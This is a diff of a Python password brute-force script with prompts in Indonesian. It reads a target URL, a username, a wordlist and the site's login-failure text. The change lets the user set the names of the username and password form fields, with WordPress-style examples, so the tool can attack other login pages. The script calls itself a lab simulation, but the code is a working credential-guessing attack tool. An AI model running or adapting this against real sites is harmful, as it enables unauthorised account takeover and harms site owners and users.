@@ -31,14 +31,13 @@ def brute_force():
     print(banner)
     
     target_url = input("[?] Masukkan URL Target: ").strip()
+    user_field = input("[?] Masukkan Nama Field Username (contoh 'log' atau 'username'): ").strip()
+    pass_field = input("[?] Masukkan Nama Field Password (contoh 'pwd' atau 'password'): ").strip()
     username = input("[?] Masukkan Username Target: ").strip()
     wordlist_path = input("[?] Masukkan Nama/Path File Wordlist: ").strip()
     fail_trigger = input("[?] Masukkan teks indikator GAGAL di web target: ").strip()
     
     print("\n[#] Memulai Simulasi Lab...")
-    print(f"[*] Target URL : {target_url}")
-    print(f"[*] Username   : {username}")
-    print(f"[*] Wordlist   : {wordlist_path}\n")
     
     words = read_wordlist(wordlist_path)
     
@@ -47,8 +46,8 @@ def brute_force():
             continue
             
         payload = {
-            "username": username,
-            "password": password
+            user_field: username,
+            pass_field: password
         }
         
         try:
